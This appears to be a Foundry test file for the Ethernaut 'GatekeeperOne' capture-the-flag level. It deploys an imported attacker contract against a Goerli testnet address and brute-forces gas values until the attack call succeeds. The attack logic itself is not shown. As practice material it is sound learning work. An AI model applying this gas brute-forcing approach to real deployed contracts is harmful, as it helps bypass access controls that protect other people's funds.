pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {GateSkipperOne} from "src/13_GatekeeperOne.sol";

contract TestGateKeeperOne is Test {
    GateSkipperOne private gateSkipperOne;

    function setUp() public {
        gateSkipperOne = new GateSkipperOne(
            0x3D47f75FdB928E3DC0206DC0Dc3470fF79A43fE2
        );
    }

    function test() public {
        for (uint256 i = 100; i < 8191; i++) {
            try gateSkipperOne.attack(i) {
                console.log("gas", i);
                return;
            } catch {}
        }
        revert("No gas match found!");
    }
}

// To run the test, paste the FORK_URL:
// =====================================
// FORK_URL=https://eth-goerli.g.alchemy.com/v2/{API_KEY}
//
//
// then run the test with:
// ========================
// forge test -vvvv --fork-url $FORK_URL --match-path test/13_GateKeeperOne.test.sol
